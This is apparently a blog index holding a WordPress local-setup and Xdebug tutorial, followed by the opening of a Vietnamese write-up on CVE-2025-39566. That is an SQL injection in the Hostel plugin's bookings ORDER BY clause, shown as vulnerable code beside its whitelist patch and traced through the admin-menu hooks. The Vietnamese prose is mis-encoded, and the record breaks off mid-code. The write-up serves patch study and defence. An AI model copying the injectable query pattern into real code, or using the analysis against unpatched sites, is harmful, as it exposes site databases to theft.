ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size M·∫∑c ƒë·ªãnh, WordPress ph·ª• thu·ªôc v√†o c·∫•u h√¨nh PHP (upload_max_filesize, post_max_size, v√† ƒë√¥i khi c·∫£ max_execution_time) ƒë·ªÉ x√°c ƒë·ªãnh dung l∆∞·ª£ng file t·ªëi ƒëa c√≥ th·ªÉ upload. Tr√™n nhi·ªÅu hosting, gi·ªõi h·∫°n n√†y ch·ªâ kho·∫£ng 2MB ‚Äì 8MB, kh√¥ng ƒë·ªß cho c√°c plugin hi·ªán ƒë·∫°i.\nWhy Increase the Limit? Plugin dung l∆∞·ª£ng l·ªõn: C√°c plugin nh∆∞ WooCommerce extension, page builder, backup, ho·∫∑c security suite c√≥ th·ªÉ n·∫∑ng 20MB ‚Äì 100MB.\nTr√°nh l·ªói upload: N·∫øu file .zip l·ªõn h∆°n gi·ªõi h·∫°n, b·∫°n s·∫Ω g·∫∑p l·ªói:\n‚ÄúThe uploaded file exceeds the upload_max_filesize directive in php.ini‚Äù Ho·∫∑c upload th·∫•t b·∫°i. Thu·∫≠n ti·ªán cho qu·∫£n tr·ªã vi√™n: C√≥ th·ªÉ c√†i tr·ª±c ti·∫øp qua Dashboard m√† kh√¥ng c·∫ßn FTP/SSH.\nH·ªó tr·ª£ ph√°t tri·ªÉn plugin: Plugin t·ª± vi·∫øt k√®m nhi·ªÅu th∆∞ vi·ªán/asset c√≥ th·ªÉ kh√° n·∫∑ng, vi·ªác tƒÉng gi·ªõi h·∫°n gi√∫p test d·ªÖ d√†ng h∆°n.\nHow to Increase Plugin Upload Size S·ª≠a php.ini (n·∫øu c√≥ quy·ªÅn server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 S·ª≠a file .htaccess (n·∫øu d√πng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Th√™m v√†o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); üëâ L·ªùi khuy√™n: Ch·ªâ n√™n ƒë·∫∑t gi·ªõi h·∫°n v·ª´a ƒë·ªß (64MB ho·∫∑c 128MB). Tr√°nh ƒë·∫∑t qu√° l·ªõn ƒë·ªÉ h·∫°n ch·∫ø nguy c∆° b·ªã upload file n·∫∑ng g√¢y qu√° t·∫£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"L·ªó h·ªïng trong plugin Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file controllers/bookings.php\nB·∫£n l·ªó h·ªïng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } B·∫£n v√°:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } üëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nHow it work? ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); C√¢u query n·∫±m trong nh√°nh default c·ªßa c·∫•u tr√∫c switch.\nTo√†n b·ªô ƒëo·∫°n x·ª≠ l√Ω na·ª≥ thu·ªôc v·ªÅ h√†m static manage() c·ªßa class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao ti·∫øp v·ªõi core th√¥ng qua Plugin API (Hook System). Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m manage() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a \u0026quot;manage\u0026quot; trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file models/hostel.php ta c√≥ h√†m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } ·ªû ƒë√¢y:\nadd_menu_page() t·∫°o menu ch√≠nh trong Admin Dashboard. add_submenu_page() th√™m c√°c submenu con cho menu ƒë√≥. Tham s·ªë $callback l√† m·ªôt callback function s·∫Ω ƒë∆∞·ª£c g·ªçi khi ng∆∞·ªùi d√πng click v√†o menu/submenu. V√≠ d·ª•:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() T·∫•t c·∫£ menu/submenu n√†y ƒë·ªÅu ƒë∆∞·ª£c ƒëƒÉng k√Ω b√™n trong h√†m static menu() c·ªßa class WPHostel. Do ƒë√≥, ƒë·ªÉ x√°c ƒë·ªãnh n∆°i h√†m menu() ƒë∆∞·ª£c g·ªçi, ta c√≥ th·ªÉ t√¨m ki·∫øm t·ª´ kh√≥a menu trong th∆∞ m·ª•c ch·ª©a plugin.\nTrong file hostel.php ·ªü th∆∞ m·ª•c g·ªëc c·ªßa plugin ta c√≥:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, 